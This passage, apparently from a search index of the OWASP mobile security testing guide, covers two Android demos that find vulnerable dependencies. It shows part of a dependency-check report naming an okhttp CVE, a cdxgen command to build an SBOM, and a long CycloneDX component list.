\"https:\\/\\/github.com\\/square\\/okhttp\\/pull\\/6353\",\n                            \"name\": \"https:\\/\\/github.com\\/square\\/okhttp\\/pull\\/6353\"\n                        }\n                    ],\n                    \"vulnerableSoftware\": [\n                        {\n                            \"software\": {\n                                \"id\": \"cpe:2.3:a:com.squareup.okhttp3:okhttp:4.9.1:*:*:*:*:*:*:*\",\n                                \"vulnerabilityIdMatched\": \"true\"\n                            }\n                        }\n                    ]\n                },\n                {\n                    \"source\": \"NVD\",\n                    \"name\": \"CVE-2023-0833\",\n                    \"severity\": \"MEDIUM\",\n                    \"cvssv3\": {\n                        \"baseScore\": 5.5,\n                        \"attackVector\": \"LOCAL\",\n                        \"attackComplexity\": \"LOW\",\n                        \"privilegesRequired\": \"LOW\",\n                        \"userInteraction\": \"NONE\",\n                        \"scope\": \"UNCHANGED\",\n                        \"confidentialityImpact\": \"HIGH\",\n                        \"integrityImpact\": \"NONE\",\n                        \"availabilityImpact\": \"NONE\",\n                        \"baseSeverity\": \"MEDIUM\",\n                        \"exploitabilityScore\": \"1.8\",\n                        \"impactScore\": \"3.6\",\n                        \"version\": \"3.1\"\n                    },\n                    \"cwes\": [\n                        \"CWE-209\"\n                    ],\n                    \"description\": \"A flaw was found in Red Hat's AMQ-Streams, which ships a version of the OKHttp component with an information disclosure flaw via an exception triggered by a header containing an illegal value. This issue could allow an authenticated attacker to access information outside of their regular permissions.\",\n                    \"notes\": \"\",\n...\n[redacted for readability]\n...\n</code></pre>","tags":["android","demo","MASTG-TEST-0272"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0050/MASTG-DEMO-0050/#evaluation","title":"Evaluation","text":"<p>Due to the number of vulnerabilities, the <code>dependency-check</code> report can be lengthy and can contain false positives. Review each of the reported instances. The dependency <code>okhttp-4.9.1.jar</code> added in the <code>build.gradle.kts</code> has known vulnerabilities and should be updated to the latest version.</p>","tags":["android","demo","MASTG-TEST-0272"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0051/MASTG-DEMO-0051/","title":"MASTG-DEMO-0051: Identifying Insecure Dependencies through SBOM Creation","text":"<p>  Download MASTG-DEMO-0051 APK   Open MASTG-DEMO-0051 Folder  Build MASTG-DEMO-0051 APK</p>","tags":["android","demo","MASTG-TEST-0272"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0051/MASTG-DEMO-0051/#steps","title":"Steps","text":"<p>Execute <code>cdxgen</code> in the root directory of the Android Studio project.</p> run.sh<pre><code>cdxgen -t java -o sbom.json\n</code></pre> <p>This will create a SBOM file that can be uploaded to  dependency-track by following  Software Composition Analysis (SCA) of Android Dependencies by Creating a SBOM.</p>","tags":["android","demo","MASTG-TEST-0272"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0051/MASTG-DEMO-0051/#observation","title":"Observation","text":"<p>In the project of  dependency-track, where the SBOM has been uploaded, the scan should have identified over 200 unique dependencies (components) with 7 vulnerable dependencies and 7 vulnerabilities (as more vulnerabilities might be found over time this number might increase).</p> sbom.json<pre><code>{\n    \"bomFormat\": \"CycloneDX\",\n    \"specVersion\": \"1.5\",\n    \"serialNumber\": \"urn:uuid:08260d88-3747-4adf-8364-e8d75174bf8e\",\n    \"version\": 1,\n    \"metadata\": {\n        \"timestamp\": \"2024-10-20T17:18:51Z\",\n        \"tools\": {\n            \"components\": [\n                {\n                    \"group\": \"@cyclonedx\",\n                    \"name\": \"cdxgen\",\n                    \"version\": \"10.10.5\",\n                    \"purl\": \"pkg:npm/%40cyclonedx/cdxgen@10.10.5\",\n                    \"type\": \"application\",\n                    \"bom-ref\": \"pkg:npm/@cyclonedx/cdxgen@10.10.5\",\n                    \"author\": \"OWASP Foundation\",\n                    \"publisher\": \"OWASP Foundation\"\n                }\n            ]\n        },\n        \"authors\": [\n            {\n                \"name\": \"OWASP Foundation\"\n            }\n        ],\n        \"lifecycles\": [\n            {\n                \"phase\": \"build\"\n            }\n        ],\n        \"component\": {\n            \"name\": \"MASTestApp\",\n            \"type\": \"application\",\n            \"group\": \"\",\n            \"version\": \"latest\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleModule\",\n                    \"value\": \"MASTestApp\"\n                },\n                {\n                    \"name\": \"buildFile\",\n                    \"value\": \"/Users/sushi2k/Documents/mastg-apps/MASTestApp-Android-MASWE-0076/build.gradle.kts\"\n                },\n                {\n                    \"name\": \"projectDir\",\n                    \"value\": \"/Users/sushi2k/Documents/mastg-apps/MASTestApp-Android-MASWE-0076\"\n                },\n                {\n                    \"name\": \"rootDir\",\n                    \"value\": \"/Users/sushi2k/Documents/mastg-apps/MASTestApp-Android-MASWE-0076\"\n                }\n            ],\n            \"purl\": \"pkg:maven/MASTestApp@latest?type=jar\",\n            \"bom-ref\": \"pkg:maven/MASTestApp@latest?type=jar\",\n            \"components\": [\n                {\n                    \"group\": \"MASTestApp\",\n                    \"name\": \"app\",\n                    \"version\": \"latest\",\n                    \"purl\": \"pkg:maven/MASTestApp/app@latest?type=jar\",\n                    \"type\": \"application\",\n                    \"bom-ref\": \"pkg:maven/MASTestApp/app@latest?type=jar\",\n                    \"properties\": [\n                        {\n                            \"name\": \"GradleModule\",\n                            \"value\": \":app\"\n                        },\n                        {\n                            \"name\": \"buildFile\",\n                            \"value\": \"/Users/sushi2k/Documents/mastg-apps/MASTestApp-Android-MASWE-0076/app/build.gradle.kts\"\n                        },\n                        {\n                            \"name\": \"projectDir\",\n                            \"value\": \"/Users/sushi2k/Documents/mastg-apps/MASTestApp-Android-MASWE-0076/app\"\n                        },\n                        {\n                            \"name\": \"rootDir\",\n                            \"value\": \"/Users/sushi2k/Documents/mastg-apps/MASTestApp-Android-MASWE-0076\"\n                        }\n                    ]\n                }\n            ]\n        },\n        \"properties\": [\n            {\n                \"name\": \"cdx:bom:componentTypes\",\n                \"value\": \"maven\"\n            },\n            {\n                \"name\": \"cdx:bom:componentNamespaces\",\n                \"value\": \"androidx.activity\\\\nandroidx.annotation\\\\nandroidx.arch.core\\\\nandroidx.autofill\\\\nandroidx.collection\\\\nandroidx.compose\\\\nandroidx.compose.animation\\\\nandroidx.compose.compiler\\\\nandroidx.compose.foundation\\\\nandroidx.compose.material\\\\nandroidx.compose.material3\\\\nandroidx.compose.runtime\\\\nandroidx.compose.ui\\\\nandroidx.concurrent\\\\nandroidx.core\\\\nandroidx.customview\\\\nandroidx.emoji2\\\\nandroidx.interpolator\\\\nandroidx.lifecycle\\\\nandroidx.profileinstaller\\\\nandroidx.savedstate\\\\nandroidx.startup\\\\nandroidx.test\\\\nandroidx.test.espresso\\\\nandroidx.test.ext\\\\nandroidx.test.services\\\\nandroidx.tracing\\\\nandroidx.versionedparcelable\\\\ncom.android.tools\\\\ncom.android.tools.ddms\\\\ncom.android.tools.emulator\\\\ncom.android.tools.utp\\\\ncom.google.android\\\\ncom.google.api.grpc\\\\ncom.google.code.findbugs\\\\ncom.google.code.gson\\\\ncom.google.crypto.tink\\\\ncom.google.errorprone\\\\ncom.google.guava\\\\ncom.google.j2objc\\\\ncom.google.protobuf\\\\ncom.google.testing.platform\\\\ncom.squareup\\\\ncom.squareup.okhttp3\\\\ncom.squareup.okio\\\\ncommons-io\\\\nio.grpc\\\\nio.netty\\\\nio.perfmark\\\\njavax.annotation\\\\njavax.inject\\\\njunit\\\\nnet.java.dev.jna\\\\nnet.sf.kxml\\\\norg.checkerframework\\\\norg.codehaus.mojo\\\\norg.hamcrest\\\\norg.jetbrains\\\\norg.jetbrains.intellij.deps\\\\norg.jetbrains.kotlin\\\\norg.jetbrains.kotlinx\"\n            }\n        ]\n    },\n    \"components\": [\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-device-provider-ddmlib\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-device-provider-ddmlib@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-device-provider-ddmlib@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools\",\n            \"name\": \"common\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools\",\n            \"name\": \"annotations\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools/annotations@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools/annotations@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.guava\",\n            \"name\": \"guava\",\n            \"version\": \"32.0.1-jre\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.guava\",\n            \"name\": \"failureaccess\",\n            \"version\": \"1.0.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.guava/failureaccess@1.0.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.guava/failureaccess@1.0.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.guava\",\n            \"name\": \"listenablefuture\",\n            \"version\": \"9999.0-empty-to-avoid-conflict-with-guava\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.guava/listenablefuture@9999.0-empty-to-avoid-conflict-with-guava?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.guava/listenablefuture@9999.0-empty-to-avoid-conflict-with-guava?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.code.findbugs\",\n            \"name\": \"jsr305\",\n            \"version\": \"3.0.2\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.code.findbugs/jsr305@3.0.2?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.code.findbugs/jsr305@3.0.2?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.checkerframework\",\n            \"name\": \"checker-qual\",\n            \"version\": \"3.33.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.checkerframework/checker-qual@3.33.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.checkerframework/checker-qual@3.33.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.errorprone\",\n            \"name\": \"error_prone_annotations\",\n            \"version\": \"2.18.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.errorprone/error_prone_annotations@2.18.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.errorprone/error_prone_annotations@2.18.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.j2objc\",\n            \"name\": \"j2objc-annotations\",\n            \"version\": \"2.8\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.j2objc/j2objc-annotations@2.8?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.j2objc/j2objc-annotations@2.8?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"net.java.dev.jna\",\n            \"name\": \"jna-platform\",\n            \"version\": \"5.6.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/net.java.dev.jna/jna-platform@5.6.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/net.java.dev.jna/jna-platform@5.6.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"net.java.dev.jna\",\n            \"name\": \"jna\",\n            \"version\": \"5.6.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/net.java.dev.jna/jna@5.6.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/net.java.dev.jna/jna@5.6.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib-jdk8\",\n            \"version\": \"1.9.20\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib\",\n            \"version\": \"1.9.20\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.20?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.20?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains\",\n            \"name\": \"annotations\",\n            \"version\": \"23.0.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains/annotations@23.0.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains/annotations@23.0.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib-jdk7\",\n            \"version\": \"1.9.20\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.9.20?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.9.20?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib-common\",\n            \"version\": \"1.9.20\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.20?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.20?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.ddms\",\n            \"name\": \"ddmlib\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.ddms/ddmlib@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.ddms/ddmlib@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.protobuf\",\n            \"name\": \"protobuf-java\",\n            \"version\": \"3.22.3\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"net.sf.kxml\",\n            \"name\": \"kxml2\",\n            \"version\": \"2.3.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/net.sf.kxml/kxml2@2.3.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/net.sf.kxml/kxml2@2.3.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-device-provider-ddmlib-proto\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-device-provider-ddmlib-proto@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-device-provider-ddmlib-proto@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlinx\",\n            \"name\": \"kotlinx-coroutines-core\",\n            \"version\": \"1.6.4\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.6.4?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.6.4?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlinx\",\n            \"name\": \"kotlinx-coroutines-core-jvm\",\n            \"version\": \"1.6.4\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm@1.6.4?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm@1.6.4?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlinx\",\n            \"name\": \"kotlinx-coroutines-bom\",\n            \"version\": \"1.6.4\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-bom@1.6.4?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-bom@1.6.4?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.testing.platform\",\n            \"name\": \"core-proto\",\n            \"version\": \"0.0.9-alpha02\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.testing.platform/core-proto@0.0.9-alpha02?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.testing.platform/core-proto@0.0.9-alpha02?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.testing.platform\",\n            \"name\": \"android-device-provider-local\",\n            \"version\": \"0.0.9-alpha02\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-ddmlib\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-device-provider-gradle\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-device-provider-gradle@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-device-provider-gradle@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-gradle\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains\",\n            \"name\": \"annotations\",\n            \"version\": \"13.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains/annotations@13.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains/annotations@13.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-gradle\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-device-provider-gradle-proto\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-device-provider-gradle-proto@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-device-provider-gradle-proto@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-device-provider-gradle\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.testing.platform\",\n            \"name\": \"android-driver-instrumentation\",\n            \"version\": \"0.0.9-alpha02\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.testing.platform/android-driver-instrumentation@0.0.9-alpha02?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.testing.platform/android-driver-instrumentation@0.0.9-alpha02?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-driver-instrumentation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.testing.platform\",\n            \"name\": \"android-test-plugin\",\n            \"version\": \"0.0.9-alpha02\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.testing.platform/android-test-plugin@0.0.9-alpha02?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.testing.platform/android-test-plugin@0.0.9-alpha02?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-additional-test-output\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-additional-test-output@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-additional-test-output@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-additional-test-output\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"utp-common\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/utp-common@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/utp-common@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-additional-test-output\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.testing.platform\",\n            \"name\": \"launcher\",\n            \"version\": \"0.0.9-alpha02\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.testing.platform/launcher@0.0.9-alpha02?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.testing.platform/launcher@0.0.9-alpha02?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-additional-test-output\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-additional-test-output-proto\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-additional-test-output-proto@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-additional-test-output-proto@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-additional-test-output\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-apk-installer\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-apk-installer@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-apk-installer@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-apk-installer\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-apk-installer-proto\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-apk-installer-proto@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-apk-installer-proto@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-apk-installer\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-coverage\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-coverage@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-coverage@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-coverage\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-coverage-proto\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-coverage-proto@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-coverage-proto@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-coverage\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-device-info\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-device-info@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": 